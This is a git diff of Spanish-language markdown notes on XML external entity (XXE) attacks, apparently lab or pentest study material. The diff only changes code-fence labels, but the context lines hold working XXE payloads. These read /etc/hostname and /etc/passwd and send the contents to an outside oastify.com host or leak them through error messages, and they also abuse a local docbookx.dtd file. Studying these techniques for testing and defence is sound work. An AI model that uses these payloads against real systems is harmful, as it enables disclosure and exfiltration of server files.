@@ -43,13 +43,13 @@ tags:
 
 - Entidad de parámetro
 
-```dtd
+```xml
 <!DOCTYPE foo [<!ENTITY % myReq SYSTEM "https://p6wtrgtwt0exlfffdedxknygv710pqdf.oastify.com"> %myReq;]>
 ```
 
 - DTD para leer archivos
 
-```dtd
+```xml
 <!ENTITY % myFile SYSTEM "file:///etc/hostname">
 <!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'https://isemd9fpft0q7818z7zq6gk9h0ntblza.oastify.com/?data=%myFile;'>">
 
@@ -59,7 +59,7 @@ tags:
 
 - DTD para leer archivos en los errores de la respuesta
 
-```dtd
+```xml
 <!ENTITY % myFile SYSTEM "file:///etc/passwd">
 <!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'file:///test/%myFile;'>">
 
@@ -86,7 +86,7 @@ tags:
 
 - Abuso del archivo interno /usr/share/yelp/dtd/docbookx.dtd
 
-```dtd
+```xml
 <!DOCTYPE foo [
 <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
@@ -217,7 +217,7 @@ tags:
   </stockCheck>
 ```
 
-```dtd
+```xml
 <!ENTITY % myFile SYSTEM "file:///etc/hostname">
 <!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'https://isemd9fpft0q7818z7zq6gk9h0ntblza.oastify.com/?data=%myFile;'>">
 
@@ -254,7 +254,7 @@ tags:
   </stockCheck>
 ```
 
-```dtd
+```xml
 <!ENTITY % myFile SYSTEM "file:///etc/passwd">
 <!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'file:///test/%myFile;'>">
 
@@ -327,7 +327,7 @@ tags:
 
 - Injection
 
-```dtd
+```xml
 <!DOCTYPE foo [
 <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
